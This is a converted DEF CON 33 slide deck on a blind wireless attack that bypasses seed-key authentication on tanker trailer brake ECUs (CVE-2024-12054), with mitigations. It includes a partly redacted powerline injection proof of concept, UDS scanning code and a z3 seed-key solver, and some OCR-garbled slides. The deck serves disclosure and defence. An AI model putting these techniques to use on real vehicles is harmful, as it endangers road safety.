---
title: "Blind Trailer Shouting"
speakers: ["Ben Gardiner"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Ben Gardiner - Blind Trailer Shouting.pdf"
pages: 43
sha256: "ad20dfbe0325883a859508ea3b86b0bbd414fd48f393997f8e46f18d80e2f219"
text_chars: 22113
ocr_pages: 4
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.0
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:54:39Z"
---
# Blind Trailer Shouting

**Speakers:** Ben Gardiner  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Ben Gardiner - Blind Trailer Shouting.pdf` (43 pages)


## Slide 1

**Blind Trailer Shouting** Ben Gardiner, DEF CON 33

## Slide 2

# **Agenda (45mins)**

- Intro / Context

   - Trailers

   - Trailer ABS vs Roll Stability

   - Truck Networks

   - Truck Hacks

   - Seed-Key Exchange

   - Powerline Leaks

   - Prev J2497 Vulns

- New Targets

      - “Any replay protection is enough”

   - New Vuln

      - **Wireshark for UDS / Faked CAN**

      - Blind, Wireless

      - **Campaigns, Custom Decoders**

      - CVE

      - Getting the Key

   - Modern Attack Surface

   - NMFTA Onsite Truck Tests

- Tanker Trailer Brakes

- Access Controls

Copyright © 2025 NMFTA Inc.

## Slide 3

# **Acknowledgments**

- On-site tests and many useful discussions with my colleague, Anne Zachos. Many thanks to her for the hard work.

- We gratefully acknowledge the insights of Jonathan Mars. We also wish to thank all of the following for their support: Trailer Equipment Manufacturers and Thomas M. Forest.

- This work was made possible by the continued support of the LTL motor freight carrier membership of the National Motor Freight Traffic Association Inc (NMFTA) and some friendly bulk haul carriers too!

Copyright © 2025 NMFTA Inc.

## Slide 4

# **Intro/Context: Trailers**

12VDC
GND
 & J2497
Trailer
Brake
ECU
Trailer  Trailer
Brake  Brake
ECU ECU
Tractor
Brake
ECU

Copyright © 2025 NMFTA Inc.

## Slide 5

# **Trailer ABS vs Roll Stability**

**Feature / Trailer ABS (Pneumatic) Trailer Roll Stability (Electro-Pneumatic) Capability Primary** Prevents wheel lock-up during braking. Prevents trailer rollover events. **Function System Type** Reactive Proactive & Predictive Can only **release and re-apply** air Can independently **build, hold, and Brake Pressure** pressure from the driver's commanded **release** air pressure in the brake **Control** level. chambers.

Copyright © 2025 NMFTA Inc.

## Slide 6

# **Truck Networks: Powerline and CAN**

## <u>J2497 (powerline phy for J1587)</u>

- 9600 bps

- One segment

## <u>J1939 (aka CAN bus)</u>

   - 250 kbps / 500 kbps

   - **Multiple segments**

   - Mission-time standardized J1939 signals and proprietary messages

- Mission-time LAMP message standardized (and others…)

- Diagnostics in proprietary Data  Diagnostics both J1939 specific Link Escape (DLE) and UDS

Copyright © 2025 NMFTA Inc.

## Slide 7

Truck Networks:
Diagnostics Stack
Diagnostics (UDS) SNMP
Diagnostics ISO 15765-2 ‘ISO-TP’ TCP
~
J1587 DLE J1939/21 IP
J2497 J1708 ~ J1939/15 J1939/14 802.11 Infra-Red 802.3 10BASE-T
On Board
Diagnostic
Connector
Tractor
Brake
ECU

Copyright © 2025 NMFTA Inc.

## Slide 8

# **Truck Hacks: Mission-time vs Diagnostics-time**

**Diagnostics Attacks / Abuses Mission-time Attacks / Abuses** Cyber-physical impacts. Cyber-physical impacts. Commands, reconfigurations and also firmware dump, Many result in a de-rate. update

**Mission-time Attacks / Abuses**

Not accepted (usually) while in Motion Works (as intended) in motion Communication via connection-oriented protocol (e.g. Communication via time-varying signals encoded in UDS, KWP2000, XCP) on top of ‘ISO-TP’ transport J1939 standard or proprietary frames, no transport protocol layer Requires successful authentication/authorization Historically only network access needed, but this is changing due to message authentication codes on the bus (e.g. SecOC)

Copyright © 2025 NMFTA Inc.

## Slide 9

# **Seed-Key Exchange**

Copyright © 2024 YFS Inc.

Copyright © 2025 NMFTA Inc.

## Slide 10

Copyright © 2024 YFS Inc.

Copyright © 2025 NMFTA Inc.


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Obtain Diag SW (3.0)
4.0 LUT extraction
4.1 RE algorithm and params Ud Hit } + i
from Diag SW
1 SecuritySession
from ECU FW.
Obtain captures of 0x27 (3.4)|
4.2 Solve for unknowns in a
known formula :
4.3 Retry seeds until repeated
from known pair
Copyright © 2024 YFS Inc.
.3 RE algorithm and para
2.3 Brute-force
2.4 Glitch past the check
Copyright © 2
```

## Slide 11

# **Numbers used once**

Valid Seed Key Pairs
f(x)=43949*x+7658 % 2**16
0x4bcb 0xef19
0xccf5 0x467b
0xe69b 0x7da9
0xc14a 0x2aec
… …
0x4bcb 0xef19

Copyright © 2025 NMFTA Inc.

## Slide 12

# **Powerline Leaking**

- CNET 2003 shared on powerline (HomePlug) leakage

- Baker & Köpsell 2013 shared HomePlug security implications

- Baker & Köhler 2020, 2022 demonstrated wireless reception and injection, DoS (‘brokenwire’) of HPGP

HPGP
J2497 PLC4TRUCKS
Intellon
 Atheros   Qualcomm

Carcelle, Xavier _Power Line Communications in Practice_ Arctech House 2006

Copyright © 2025 NMFTA Inc.

## Slide 13

# **Previous J2497 Wireless Vulns**

- Remote Read <u>CVE-2020-14514: can read J2497 from ~15’ (equip dependent) using active</u> antennas

- Remote Write <u>CVE-2022-26131: can write J2497 from ~15’ (equip dependent) using 50W</u> power amplifier and 40’ wire antenna

12VDC  & J2497
GND
Copyright © 2025 NMFTA Inc.

## Slide 14

# **New Targets: Tanker Trailer Brakes**

- Roll Stability Trailer Brake ECU

- KWP2000 Diagnostics

- 16bit seed key exchange

Copyright © 2025 NMFTA Inc.

## Slide 15

Copyright © 2025 NMFTA Inc.

## Slide 16

# **Diagnostics Interfacing**

KWP2000 (Diagnostics) ISO-TP J1587 (7byte DLEs) J2497

Make fake CAN via a simple, custom pythoncan driver

**python-can** **RP1210 J1587 DLE Bridge py-hv-networks (python) RP1210 RP1210 DLL Driver Server Windows Driver ABIs VDA Windows Driver VDA J2497 Interface**

Copyright © 2025 NMFTA Inc.

## Slide 17

# **Wireshark of Diagnostics**

\```
[...]
\```

\```
(2541.884491) j1708 acfe8902310affffffff
(2541.944793) j1708 89feac101a710a1200ff
(2542.024034) j1708 acfe8930000affffffff
(2542.087162) j1708 89feac21ff0000000003
(2542.122451) j1708 89feac2200ffff0f6fd9
(2542.156541) j1708 89feac2396ffffffffff
(2542.191573) j1708 89feac24ff0000ffffff
(2542.277863) j1708 acfe89022703ffffffff
(2542.339263) j1708 89feac04670346ffffff
(2542.431005) j1708 acfe890427043463ffff
(2542.496718) j1708 89feac03670434ffffff
[...]
\```

Copyright © 2025 NMFTA Inc.

## Slide 18

# **Decode As…**

Use the decode as… right-click menu to

1. add a ‘next level CAN dissector’ of ‘ISO 15765’

2. add a ‘next level ISO 15765 dissector’ of ‘UDS’

Set the display filter to ‘uds’ to remove ISO-TP fragments Use the Column preferences… rightclick menu to turn on the ‘Information’ column and disable others (until needed)

Copyright © 2025 NMFTA Inc.

## Slide 19

# **We can get stuff like this**

Copyright © 2025 NMFTA Inc.


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IDSC
133
DSC=133
DSC=131 DSC=133
DSC=131 | session133tp1
DSC=134
IDSC=134
session
DSC=131 osc
session131tp1
DSC=129 DSC
DSC=131 DSC=
DSC=135 \DSC=131
134tp1
131 DSC=137
DSC=135 DSC=129
session137tp1
session129tp1
SC=137 IDSC=134
IDSC
129
```

## Slide 20

# **With scapy UDS_Scanner**

\```
def reset():
isock.sr1(UDS() / UDS_ER(resetType=0x01), verbose=False, timeout=1.0)
time.sleep(6.0)
def reconnect():
    return ISOTPSocket(csock, tx_id=SEND_TO_ID, rx_id=RECV_FR_ID, basecls=UDS)
s = UDS_Scanner(reconnect(), reconnect_handler=reconnect,
reset_handler=reset,
test_cases=[UDS_DSCEnumerator],
UDS_DSCEnumerator_kwargs={
'timeout': 2.0,
'retry_if_none_received': True,
'retry_if_busy_returncode': True,
'scan_range': [x for x in range(0, 256)]
                })
s.scan()
s.show_testcases_status()
s.show_testcases()
\```

Copyright © 2025 NMFTA Inc.

## Slide 21

**Test Reset Influence on Seeds (scapy.automotive version)**

\```
isock.sr1( UDS() / UDS_ER(resetType=0x01))
time.sleep(7.0)  # FIXME: more accurate sleep() needed
\```

\```
isock.sr1( UDS() / UDS_DSC(diagnosticSessionType=0x83)) # DSC request
isock.sr1( UDS() / UDS_SA(securityAccessType=0x03))     # SA seed request
print(_.securitySeed)
\```

Copyright © 2025 NMFTA Inc.

## Slide 22

# **‘Blind’?**

- The ‘blind’ limitation is imposed by simplicity: transmit only SDRs.

- It is definitely possible to create a receive-and-transmit wireless seed-key exchange attack

   - It would require writing more (terrible) python code

   - It could have a lower range maybe too

   - But it could just successfully complete seed-key exchange

- Blind attack must get the timing ‘just right’

Copyright © 2025 NMFTA Inc.

## Slide 23

# **How this was Done**

“Treat like glitch campaigns”

1. Create custom sigrok decoder to test and display pass/fail 2. Create sweeps of delays

3. Look at custom decoder output to analyze

Copyright © 2025 NMFTA Inc.

## Slide 24

# **Inspecting and Injecting J2497**

**sr-j1587_DLE: UDS, UDS responses, Non-DLE LAMP Campaign Status sr-j1708: MID, payload, Errors UART decoder sigrok Pulseview USB (…) Logic Analyzer Digital Input UART RX Analog Input**

**DG Tech PLC Testcon SSC P485**

**DG Tech PLC Testcon Coupling Circuit Intellon SSC P485 Powerline modulation (on target)**

Copyright © 2025 NMFTA Inc.

## Slide 25

# **Campaigns, Custom Decoders (1 of 3)**

\```
[…]
\```

- Create a custom decoder to consume srj1708 decoder output

- Start with code for ‘annotation rows’ categorizing the j1708 messages as:

   - LAMP

   - Other J2497

   - DLEs

   - UDS (DLEs with sensible ISO-TP first byte)

\```
annotation_rows = (
        ('lamp', 'lamp messages', (ANNOTATION_LAMP,)),
        ('other', 'other messages', (ANNOTATION_OTHER,)),
        ('dles', 'DLE Messages', (ANNOTATION_DLE,)),
        ('uds', 'UDS messages', […]
 […]
\```

\```
def handle_message(self):
        if len(self.data) == 0:
            return
data_print = self.get_hex(self.data[0:-1])
\```

\```
if data_print == '0a00' or data_print == '0bff':
self.put(self.startsample_block, self.endsample_block, self.out_ann,
                     [Decoder.ANNOTATION_LAMP, [data_print]])
elif self.data[1] == 0xfe:
self.put(self.startsample_block, self.endsample_block, self.out_ann,
                     [Decoder.ANNOTATION_DLE, [data_print]])
self.handle_uds()
else:
\```

\```
self.put(self.startsample_block, self.endsample_block, self.out_ann,
                     [Decoder.ANNOTATION_OTHER, [data_print]])
return
 […]
\```

Copyright © 2025 NMFTA Inc.

## Slide 26

# **Campaigns, Custom Decoders (2 of 3)**

- Add another annotation row for:

• Positive and negative acknowledged UDS requests

Copyright © 2025 NMFTA Inc.

## Slide 27

# **Campaigns, Custom Decoders (3 of 3)**

- Finally code ‘attempt results’ campaign status annotation row.

   - This changed over the course of the exploration

   - In the last search it detected if a seed was emitted or not:

Copyright © 2025 NMFTA Inc.

## Slide 28

# **Possible Time Slots**

- A: short (~100ms) window, one-msg queue with rx confirmed at B

   - but doesn’t change state for a subsequent SA request

- C: earliest point for UDS state change

- D: reset request confirmation – delays are very low jitter from this point

- <u>Any timing variation makes sending long UDS messages more likely to collide</u>

Copyright © 2025 NMFTA Inc.

## Slide 29

# **Shhhh’ing the Target (grooming)**

- J2497 dynamic addressing (the de facto one, not the standard) can be abused

- Bonus: dynamic addressing reacts on any message received so we can use very short ones to increase the likelihood of getting received without collision

1. Send MID storm, but no MID==f7 -> target moves to f7

2. Send MID==f7 -> target moves to 89

3. Wait while target is silent and deaf for a predictable delay

4. Send reset request

Copyright © 2025 NMFTA Inc.

## Slide 30

# **The PoC [REDACTED]**

\```
for tid in ['89', '8a', '8b', 'f6', 'f7’]:
# avoid later rejected reset requests by …
badkey_chirps = get_chirps('acfe' + tid + '042704BAAD', sample_rate)
\```

\```
yield np.concatenate([badkey_chirps, min_silence]*3) # … send bad keys to all trailers
for tid in ['89', '8a', '8b', 'f6’]: # move target to mid f7
\```

\```
yield np.concatenate([get_chirps(tid + '7400', sample_rate), min_silence]*3)
yield get_silence(XXX, sample_rate)              # wait for the target to become responsive
c = get_chirps('f7' + '7400', sample_rate)          # send from f7, target is now at 89
c = np.concatenate([c, get_silence(XXX, sample_rate)])   # wait to be responsive
c = np.concatenate([c,
\```

\```
get_chirps('acfe' + '89' + '021101', sample_rate)])  # send reset
c = np.concatenate([c,get_silence(XXX, sample_rate)])   # wait to become responsive
c = np.concatenate([c,
\```

\```
get_chirps('acfe' + '89' + '021083', sample_rate)])  # UDS DiagSessionControl type 0x83
c = np.concatenate([c,get_silence(XXX, sample_rate)])   # wait for inter-message gap
yield np.concatenate([c,
\```

\```
get_chirps('acfe' + '89' + '022703', sample_rate)])  # UDS SecurityAcess type 0x03
    # TODO send key matching most likely seed
\```

Copyright © 2025 NMFTA Inc.

## Slide 31

Copyright © 2025 NMFTA Inc.


> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
> UA
> 31
wil
RT: RX bits
RT: RX data
RT: RX warnings
RT: RX breaks
708: RX Fields
f08: RX Data
708: RX Message Delays
Show this row Show All Hide All
I lamp messages
$87_DLE: other messages
Show this row Show All Hide All
© other messages
387_DLE: Data Link Escape Messages
Show this row Show All Hide All
I a data link escape
$87_DLE! UDS messages | | | | |
Show this row Show All Hide All
I uds messages (@ MM confirmed positive UDS messages [J Ml confirmed negative UDS messages (@ MM timed out uds messages
OK, Seed: 85a9 4 OK. Seed: 85a9 4 OK. Seed: 85a9 4 OK. Seed: 85a9
OK. Seed: 85ac
OK. Seed: 7244 4 OK. Seed: 723f
OK. Seed: 72
Seed: 7244 4 OK. Seed: 7244 4 O
Copyright © 2025 NMFTA Ine:
```

## Slide 32

- Good news: Doesn’t scale to arbitrary units

# New CVE

Determinism:

>50% for a 30s per attempt

>90% for 2.5 minutes per attempt

   - 4 units tested. All different built dates. 3 different firmware versions Different first seeds on each

- Uncertainties

   - How varied is the first seed out of 65K possible?

Date of first contact: 2024-02-14

CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:N/I:L/A :H 5.4 Medium

CWE-305 Authentication Bypass by Primary Weakness

**CVE-2024-12054** and **ICSA-25-021-03** issued January 21 2025

|**Build Date**|**Firmware**|**First Seed (fake)**|
|---|---|---|
|2008|`X`|0xabad|
|2018|`Y`|0x5eed|
|2021|`Z`|0x57aa|
|2023|`Z`|0x71cc|

Copyright © 2025 NMFTA Inc.

## Slide 33

# **Getting the Key**

Copyright © 2025 NMFTA Inc.


> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Obtain ECU FW (3.2)
'pt ; | a | 13.3 RE algorithm and params}
1.0 'Pirate from ECU FW
1 SecuritySession
from Diag SW
Obtain captures of mae VA
4.2 Solve for unknowns in a
known formula |
4.3 Retry seeds until repeated
from known pair
2.3 Brute-force
2.4 Glitch past the check!
Copyright © 2
```

## Slide 34

# **Getting some keys**

_“There's something very comforting about the fact that the technique still works”_ -- haystack

Copyright © 2025 NMFTA Inc.

## Slide 35

`from z3 import BitVec, BitVecVal, Extract, Concat, sat, Solver def check_pairs(` _`solver`_ `,` _`routine`_ `,` _`pairs`_ `):` **Getting all the keys** `for challenge_val, response_val in` _`pairs`_ `:` _`solver`_ `.push()` _`solver`_ `.add(response_val ==` _`routine`_ `(challenge_val)) if` _`solver`_ `.check() != sat:` _`print`_ `(f"invalid at seed-key pair: ({challenge_val}, {response_val})") return False return True m = BitVec('m', 16) b = BitVec('b', 16) def linear_seed_key_routine(` _`seed`_ `): global m, b return m *` _`seed`_ `+ b` _`# these are BitVec 16-bit so the math is # by-default modulo 2**16`_ `@interact_manual def solveitsolveitnow(): global df solver = Solver() integer_df = df.map(lambda` _`x`_ `:` _`int`_ `(x, 16)) pairs_from_table = [(BitVecVal(challenge, 16), BitVecVal(response, 16)) for challenge, response in` _`zip`_ `(integer_df['seed (hex)'], integer_df['key (hex)'])] if check_pairs(solver, linear_seed_key_routine, pairs_from_table):` _`print`_ `(f"{linear_seed_key_routine.` _`__name__`_ `} is potentially valid!")` _`print`_ `(f"likely values: {solver.model()}") else:` _`print`_ `(f"{linear_seed_key_routine.` _`__name__`_ `} is invalid")`

Copyright © 2025 NMFTA Inc.

## Slide 36

# **Modern Attack Surface**

Trailer
Brake
ECU
Trailer  Trailer
Brake  Brake
ECU ECU
Tractor
Brake
ECU

Copyright © 2025 NMFTA Inc.

## Slide 37

# **Onsite Truck Tests**

<u>https://github.com/nmfta-repo/nmftavehicle_cybersecurity_requirements/blob/main /resources/heavy_vehicle_testing_plan.md</u>

Copyright © 2025 NMFTA Inc.

## Slide 38

# **Mitigations**

- Brake ECUs should be using cryptographically secure seed-key exchange. Service $29 is a great option

   - But should not centralize the authorization for diagnostics. There should be delegation of authority or authority provisioning mechanism as well for equipment owners

- Trailer Telematics Devices should satisfy comprehensive security requirements <u>https://nmfta.org/wp-content/media/2022/11/NMFTA-Cybersecurity-Requirements-forTelematics-Systems-v1.5.pdf</u>

- New Tractors should protect trailers from wireless injection attacks <u>https://nmfta.org/wpcontent/media/2022/11/Actionable_Mitigations_Options_v9_DIST.pdf</u>

   - We’ve Petitioned SAE T&B committee to re-open J2497 and recommend wireless attack mitigations in the new version and provided draft J2497 changes to capture the above, participated in the meetings

Copyright © 2025 NMFTA Inc.

## Slide 39

# **Questions?**

Please send feedback to our COO Joe.Ohr@nmfta.org **Blind Wireless Seed-Key Unlock** **<u>https://nmfta.org/wpcontent/media/2025/01/Blind-Wireless-SeedKey-Unlock-Whitepaper-final.pdf</u>**

Copyright © 2025 NMFTA Inc.

## Slide 40

# **Acknowledgments**

- On-site tests and many useful discussions with my colleague, Anne Zachos. Many thanks to her for the hard work.

- We gratefully acknowledge the insights of Jonathan Mars. We also wish to thank all of the following for their support: Trailer Equipment Manufacturers and Thomas M. Forest.

- This work was made possible by the continued support of the LTL motor freight carrier membership of the National Motor Freight Traffic Association Inc (NMFTA) and some friendly bulk haul carriers too!

Copyright © 2025 NMFTA Inc.

## Slide 41

# **References**

Haystack & Sixvolts, Cheap Tools For Hacking Heavy Trucks, DEF CON 24 CHV https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20SixVolts-and-Haystack-Cheap-Tools-For-HackingHeavy-Trucks.pdf

Haystack & Sixvolts, TruckDuck (tool), https://truckhacking.github.io/

SAE J2497 https://www.sae.org/standards/content/j2497_201207/

SAE J1708 https://www.sae.org/standards/content/j1708_200408/

SAE J1587 https://www.sae.org/standards/content/j1587_201301/

ISO 14230-3 (KWP2000) https://www.iso.org/standard/23921.html

Keyword Protocol 2000 - Diagnostic Parameters, WABCO, https://www.wabco-customercentre.com/catalog/docs/4461702060_-_444_-_73.pdf 2002, Accessed 2024 Willem Melching, https://icanhack.nl/blog/vw-part1/ 2021

Willem Melching, https://github.com/I-CAN-hack/pq-flasher/blob/95d283075714c9476cacc6ef041fd810abc86f8a/kwp2000.py 2021

Camille Gay, https://github.com/ToyotaInfoTech/RAMN/blob/main/firmware/RAMNV1/Core/Src/ramn_kwp2000.c 2021

ATA TMC (S.1) Next Generation Tractor/Trailer Electrical Interface -- https://tmcconnect.trucking.org/communities/communityhome/digestviewer/viewthread?GroupId=2173&MessageKey=1dd4568e-400f-4d11-b481-b68961657165&CommunityKey=782c741b-674d-4af4-b9629019b3e7d056&tab=digestviewer&ReturnUrl=%2fcommunities%2fcommunity-home%2fdigestviewer%3ftab%3ddigestviewer%26CommunityKey%3d782c741b-674d-4af4b962-9019b3e7d056%26ssopc%3d1&ssopc=1

ATA TMC (S.1) Next Generation Tractor/Trailer Electrical Interface New TMC Webinar Series Alert: Next Generation Trailer Electrical/Electronic Architecture -- https://tmcconnect.trucking.org/communities/community-home/digestviewer/viewthread?GroupId=2173&MessageKey=384c5d4e-4f7e-4e4d-b2b0d47047fa8f78&CommunityKey=782c741b-674d-4af4-b962-9019b3e7d056&tab=digestviewer&ReturnUrl=%2fcommunities%2fcommunityhome%2fdigestviewer%3fcommunitykey%3d782c741b-674d-4af4-b962-9019b3e7d056%26tab%3ddigestviewer

NMFTA, Actionable Mitigation Options for J2497 Attacks https://nmfta.org/wp-content/media/2022/11/Actionable_Mitigations_Options_v9_DIST.pdf, public domain, 2022

Copyright © 2025 NMFTA Inc.

## Slide 42

ICS Advisory (ICSA-20-219-01) Trailer Power Line Communications https://www.cisa.gov/uscert/ics/advisories/icsa-20-219-01 https://nvd.nist.gov/vuln/detail/CVE-202014514

ICS Advisory (ICSA-22-063-01) Trailer Power Line Communications (PLC) J2497 https://www.cisa.gov/uscert/ics/advisories/icsa-22-063-01 https://nvd.nist.gov/vuln/detail/CVE-2022-25922 https://nvd.nist.gov/vuln/detail/CVE-2022-26131

Sekar Kulandaivel, Shalabh Jain, Jorge Guajardo, and Vyas Sekar. 2024. CANdid: A Stealthy Stepping-Stone Attack to Bypass Authentication on ECUs. ACM J. Auton. Transport. Syst. Just Accepted (April 2024). https://doi.org/10.1145/3657645

49 CFR § 571.121 - Standard No. 121; Air brake systems.

49 CFR § 393.55 - Antilock brake systems.

Tom Berg, Tests shedding light on ABS warning systems Trucknews.com https://www.trucknews.com/features/tests-shedding-light-on-abs-warning-systems/

Bruce Sauer, New Power for Trailers https://www.bulktransporter.com/archive/article/21649717/new-power-for-trailers

Jim Mele, PLC4TRUCKS Hits a Snag https://www.fleetowner.com/news/article/21664669/plc4trucks-hits-a-snag

DOT Task Order 7 of the Commercial Motor Vehicle Technology Diagnostics and Performance Enhancement Program https://rosap.ntl.bts.gov/view/dot/155/dot_155_DS1.pdf

Balun One Nine https://www.nooelec.com/store/balun-one-nine.html

Yapo, Ted. FL2K AM LPF May 2018 https://oshpark.com/shared_projects/OOkzY6K6 Accessed 20220407

Haystack, Python Heavy Vehicle Interface https://truckhacking.github.io/

Sigrok, https://sigrok.org/

Scapy, https://scapy.readthedocs.io/

Copyright © 2025 NMFTA Inc.

## Slide 43

Texas Instruments Beaglebone and PRU SDKs http://downloads.ti.com/codegen/esd/cgt_public_sw/PRU/2.1.1/ti_cgt_pru_2.1.1_armlinuxa8hf_busybox_installer.sh http://downloads.ti.com/sitara_linux/esd/AM335xSDK/exports/ti-sdk-am335x-evm-07.00.00.00-Linux-x86-Install.bin http://software-dl.ti.com/sitara_linux/esd/PRUSWPKG/01_00_00_00/exports/pru-addon-v1.0-Linux-x86-Install.bin https://git.ti.com/cgit/pru-software-support-package/pru-software-support-package/

Poore, Chris, and Gardiner, Ben. “Power Line Truck Hacking: 2TOOLS4PLC4TRUCKS.” DEF CON 28 Car Hacking Village 2019. http://www.nmfta.org/documents/ctsrp/Power_Line_Truck_Hacking_2TOOLS4PLC4TRUCKS.pdf?v=1

Poore, Chris, and Gardiner, Ben. "Trailer Shouting." DEF CON 30

Eduard Kovacs, Tractor-Trailer Brake Controllers Vulnerable to Remote Hacker Attacks, SecurityWeek https://www.securityweek.com/tractor-trailer-brake-controllersvulnerable-remote-hacker-attacks 2022

Jason McDaniel, NMFTA demonstrates how hackers can disable trucks and trailers. FleetOwner https://www.fleetowner.com/technology/article/21276785/how-trucks-andtrailers-are-susceptible-to-cyber-criminal-hacks 2023

Copyright © 2025 NMFTA Inc.
